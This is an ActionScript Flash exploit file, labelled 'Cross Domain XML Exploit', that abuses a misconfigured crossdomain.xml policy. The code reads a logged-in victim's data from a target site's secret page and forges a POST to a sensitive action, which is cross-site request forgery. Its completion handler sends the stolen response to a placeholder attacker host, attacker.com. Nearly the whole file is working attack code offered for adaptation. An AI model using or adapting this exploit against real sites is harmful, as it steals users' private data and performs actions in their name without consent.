// Exploit Name: Cross Domain XML Exploit
// Author: Roshan Thomas
// Adaptation of an exploit by John M as defined in 
// https://medium.com/@x41x41x41/exploiting-crossdomain-xml-missconfigurations-3c8d407d05a8
// PHP serverside is replaced with a simpler python server.

package {
 import flash.display.Sprite;
 import flash.events.*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLVariables;
 import flash.net.URLLoader;
 import flash.net.URLLoaderDataFormat;

 public class crossDomain extends Sprite {
  public function crossDomain() {

   // Cross Domain Information Leakage
   // Fetching  information from the target website for a logged in user. 
   // Modify this URL to the actual target URL whose response would have some value of interest

   var firstrequest:URLRequest = new URLRequest("https://www.target.com/secret.jsp?&id=2352516");
   var firstloader:URLLoader = new URLLoader();
   firstloader.addEventListener(Event.COMPLETE, completeHandler);
   try {
    firstloader.load(firstrequest);
   } catch (error: Error) {
    trace("Unable to load URL: " + error);
   }

   // Cross Site Request Forgery 
   // Now lets do a POST request
   // Modify this URL to the actual target URL whose action is of significance


   var secondvariables:URLVariables = new URLVariables("variable1=value1&variable2=value2&variable3=value3");
   var secondrequest:URLRequest = new URLRequest("https://www.target.com/sensitiveaction.jsp");
   secondrequest.method = URLRequestMethod.POST;
   secondrequest.data = secondvariables;
   var secondloader:URLLoader = new URLLoader();
   secondloader.dataFormat = URLLoaderDataFormat.VARIABLES;
   try {
    secondloader.load(secondrequest);
   } catch (error: Error) {
    trace("Unable to load URL");
   }

  }

  private function completeHandler(event: Event): void {

   // Retreiving the HTTP responses from target.com to attacker server.
   // Replace this value with the attacker hostname.
   
   var request:URLRequest = new URLRequest("https://attacker.com");
   var variables:URLVariables = new URLVariables();
   variables.data = event.target.data;
   request.method = URLRequestMethod.POST;
   request.data = variables;
   var loader:URLLoader = new URLLoader();
   try {
    loader.load(request);
   } catch (error: Error) {
    trace("Unable to load URL");
   }
  }
 }
}